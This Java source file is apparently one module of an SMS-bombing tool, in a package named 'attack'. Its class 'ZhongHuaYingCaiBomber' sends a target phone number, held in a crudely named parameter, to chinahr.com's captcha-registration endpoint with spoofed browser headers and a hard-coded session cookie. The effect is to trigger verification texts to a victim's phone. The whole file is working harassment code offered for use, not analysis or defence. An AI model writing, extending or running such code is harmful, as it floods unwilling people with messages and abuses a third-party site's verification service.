package com.utils.attack;

import com.utils.HttpUtil;
import org.apache.http.impl.client.CloseableHttpClient;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by fz on 2015/8/23.
 */
public class ZhongHuaYingCaiBomber implements MessageBomber{

    public String name;

    public ZhongHuaYingCaiBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        String url = "http://www.chinahr.com/modules/jsperson/reg.php?action=phoneCaptch";
        Map headers = new HashMap();
        headers.put("Accept", "text/plain, */*; q=0.01");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("DNT", "1");
        headers.put("Host", "www.chinahr.com");
        headers.put("Origin", "http://www.chinahr.com");
        headers.put("Referer", "http://www.chinahr.com/");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36");
        headers.put("X-Requested-With", "XMLHttpRequest");
        headers.put("Cookie", "_ga=GA1.2.455789517.1440341284; _gat=1; ipgoto_fixurl=http%3A//www.chinahr.com/; currentCityId=; __utmt=1; __utma=162484963.455789517.1440341284.1440341284.1440341284.1; __utmb=162484963.1.10.1440341284; __utmc=162484963; __utmz=162484963.1440341284.1.1.utmcsr=baidu|utmccn=(organic)|utmcmd=organic; PHPSESSID=e1i9m60b3ur4b08mbkdfp3ga02; regPhoneCode=64cd34f157592c400675246c1f934f5f");
        Map params = new HashMap();
        params.put("mobile", fuckNo);
        String result = HttpUtil.httpPost(url, headers, params);
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
